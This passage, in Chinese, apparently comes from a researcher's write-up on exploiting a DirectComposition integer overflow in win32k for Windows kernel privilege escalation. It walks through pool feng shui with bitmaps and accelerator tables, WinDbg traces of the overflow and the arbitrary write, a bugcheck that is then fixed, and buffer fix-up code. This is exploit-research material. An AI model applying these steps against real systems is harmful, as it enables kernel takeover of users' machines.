address泄露出来，然后精准布局szBuf即可。
接下来我们来完成最后的利用，首先是利用Accelerator来制造一个稳定的hole并且通过gsharedinfo泄露出来，这里有个比较特殊的地方，由于我们需要控制bitmap的nheight，因此需要在createbitmap的时候控制第二个参数BitmapInfo.hBitmap
= CreateBitmap(0x200, 0x45, 1, 1, 0); // nHeight should be 0x45。
这样我们需要来控制申请pool的大小，这里我逆向了createbitmap和createacceleratortable函数。
    kd> kb
    ChildEBP RetAddr  Args to Child              
    ac147a9c 946ea1aa 00000021 00000290 35306847 win32kfull!Win32AllocPoolImpl+0x35
    ac147abc 946e6da2 00000001 ac147b90 00000004 win32kbase!PALLOCMEM2+0x24
    ac147ad4 946e72ce 00000290 00000005 00000001 win32kbase!AllocateObject+0xe2
    ac147b40 946d43a9 ac147b90 00000000 00000000 win32kbase!SURFMEM::bCreateDIB+0x30e
    ac147bac 988f085d 00000001 00000045 00000001 win32kbase!GreCreateBitmap+0xe9
    ac147bf8 81d502c7 00000001 00000045 00000001 win32kfull!NtGdiCreateBitmap+0x33
    kd> kb
    ChildEBP RetAddr  Args to Child              
    abc32b5c 946f9e87 00000102 63617355 00a72e90 win32kbase!Win32AllocPoolWithQuotaZInit+0xc
    abc32b84 989044d5 a24b8428 00000000 947a4a5c win32kbase!HMAllocObject+0x1e7
    abc32bcc 98904486 7c04caef 00a72da0 0076f8d0 win32kfull!_CreateAcceleratorTable+0x29
    abc32c04 81d502c7 00a72da0 00000028 0076f8e0 win32kfull!NtUserCreateAcceleratorTable+0x5e
这里的win32kfull!_CreateAcceleratorTable中找到了关于accelerator申请大小的地方。
    int __stdcall NtUserCreateAcceleratorTable(unsigned int a1, unsigned int a2)
      v3 = 6 * a2;//a2 = Accelerator第二个参数
      if ( 6 * a2 )
      {
        v4 = *(_BYTE **)_W32UserProbeAddress;
        if ( v3 + a1 > *(_DWORD *)_W32UserProbeAddress || v3 + a1 updatepropertyvalue过程的分析。
    kd> p
    win32kbase!DirectComposition::CPropertyBagMarshaler::SetBufferProperty+0x38:
    946f8670 83ff10          cmp     edi,10h
    kd> r edi//首先比较size大小，这里我们已经置为0x20
    edi=00000020
    ……
    //managerbitmap的地址是0x8c8e1000，workerbitmap的地址是0x8c8e3000
    kd> p
    win32kbase!DirectComposition::CPropertyBagMarshaler::SetBufferProperty+0x42:
    946f867a 51              push    ecx
    kd> dd b7580010 l5//可以看到szbuf的覆盖情况，其中+0x8h的地方是bitmap中pvscan0-0xc的值，+0xc是0x45
                                      // +0x10是workerbitmap的pvscan0
    b7580010  71def72d 58ac0714 8c8e1024 00000045
    b7580020  8c8e3030
    kd> r ecx
    ecx=b7580010
    ……
    kd> p//漏洞触发
    win32kbase!DirectComposition::CPropertyBagMarshaler::UpdatePropertyValue+0x12:
    946f8254 83e80c          sub     eax,0Ch//integer overflow
    kd> p
    win32kbase!DirectComposition::CPropertyBagMarshaler::UpdatePropertyValue+0x15:
    946f8257 3bf0            cmp     esi,eax
    kd> r esi
    esi=8c8e1024//比较的值是managerbitmap，由于整数溢出，所以这个值会比0xfffffff4小，可以通过判断
    kd> r eax
    eax=fffffff4//integer overflow是个无符号数，极大值
    ……
    kd> p//与0x45比较，eax的值已经通过szbuf布局
    win32kbase!DirectComposition::CPropertyBagMarshaler::UpdatePropertyValue+0x2a:
    946f826c 83f845          cmp     eax,45h
    kd> p
    win32kbase!DirectComposition::CPropertyBagMarshaler::UpdatePropertyValue+0x2d:
    946f826f 7e37            jle     win32kbase!DirectComposition::CPropertyBagMarshaler::UpdatePropertyValue+0x66 (946f82a8)
    kd> r eax
    eax=00000045
    ……
    kd> p//任意地址写！
    win32kbase!DirectComposition::CPropertyBagMarshaler::UpdatePropertyValue+0x55eb8:
    9474e0fa a5              movs    dword ptr es:[edi],dword ptr [esi]
    kd> r esi
    esi=a42aca90
    kd> dd esi l1
    a42aca90  8c8e3030
    kd> r edi
    edi=8c8e1030
    kd> dd 8c8e1030 l1
    8c8e1030  8c8e117c
到这里我们完成了对managerbitmap的pvscan0的写入，写入的内容是workerbitmap的pvscan0地址，这样我们就完成了data
attack的准备工作，但是到这里的时候，我执行后面的任意地址读写的时候触发了BSoD bugcheck。
    kd> !analyze -v
    *******************************************************************************
    *                                                                             *
    *                        Bugcheck Analysis                                    *
    *                                                                             *
    *******************************************************************************
    PAGE_FAULT_IN_NONPAGED_AREA (50)
    Invalid system memory was referenced.  This cannot be protected by try-except,
    it must be protected by a Probe.  Typically the address is just plain bad or it
    is pointing at freed memory.
    Arguments:
    Arg1: 87a98104, memory referenced.
    Arg2: 00000000, value 0 = read operation, 1 = write operation.
    Arg3: 988e91ea, If non-zero, the instruction address which referenced the bad memory
        address.
    Arg4: 00000000, (reserved)
    FAULTING_IP: 
    win32kfull!bDoGetSetBitmapBits+4a
    988e91ea 8b0c8560a5aa98  mov     ecx,dword ptr win32kfull!galBitsPerPixel (98aaa560)[eax*4]
后来我检查了一下，发现是szbuf的写入有问题，在updatepropertyvalue函数中，是连续写入的，也就是除了写入我们想要的bitmap.pvscan0，还在写入想要值之后，还写入了一些junk
data。
    .text:0009E0FA                 movsd    //写入bitmap.pvscan0
    .text:0009E0FB ; 48:                 *v15 = *(_DWORD *)v14;
    .text:0009E0FB ; 49:                 v19 = (int)(v14 + 4);
    .text:0009E0FB ; 50:                 v18 = (int)(v15 + 1);
    .text:0009E0FB
    .text:0009E0FB loc_9E0FB:                              ; CODE XREF: DirectComposition::CPropertyBagMarshaler::UpdatePropertyValue(PropertyUpdate const *,uint)+55E76j
    .text:0009E0FB                 movsd     //写入了junk  data
    .text:0009E0FC ; 51:                 *(_DWORD *)v18 = *(_DWORD *)v19;
    .text:0009E0FC                 movsd    //写入了junk  data
    .text:0009E0FD ; 52:                 *(_DWORD *)(v18 + 4) = *(_DWORD *)(v19 + 4);
    .text:0009E0FD                 movsd    //写入了junk  data
这部分数据覆盖了bitmap的kernel object，需要对szbuf再做一点fix。
    kd> dd 8c93f000
    8c93f000  c4050ace 00000001 00000000 00000000
    8c93f010  00000000 c4050ace 00000000 00000000
    8c93f020  00000200 00000045 00001140 8c93f17c
    8c93f030  8c941030 ea3da585 ca8bfc2f 7bbfb6e9//key!!!这里写入了一些junk data，影响了kernel object
    //对szbuff进行fix
        CopyMemory(szBuff+0x14, &lpFakeBitmapElement_1,0x4);
        CopyMemory(szBuff+0x18, &lpFakeBitmapElement_2,0x4);
        CopyMemory(szBuff+0x1C, &lpFakeBitmapElement_3,0x4);
最后我们完成提权。
## 0x04 参考资料
[https://github.com/progmboy/cansecwest2017](https://github.com/progmboy/cansecwest2017)
[https://github.com/k0keoyo/Dark_Composition_case_study_Integer_Overflow](https://github.com/k0keoyo/Dark_Composition_case_study_Integer_Overflow)
[https://whereisk0shl.top/Dark%20Composition%20Exploit%20in%20Ring0.html](https://whereisk0shl.top/Dark%20Composition%20Exploit%20in%20Ring0.html)
[https://siberas.de/blog/2017/10/05/exploitation_case_study_wild_pool_overflow_CVE-2016-3309_reloaded.html](https://siberas.de/blog/2017/10/05/exploitation_case_study_wild_pool_overflow_CVE-2016-3309_reloaded.html)
[https://www.anquanke.com/post/id/85579](https://www.anquanke.com/post/id/85579)
[https://www.coresecurity.com/system/files/publications/2016/10/Abusing-GDI-Reloaded-ekoparty-2016_0.pdf](https://www.coresecurity.com/system/files/publications/2016/10/Abusing-GDI-Reloaded-ekoparty-2016_0.pdf)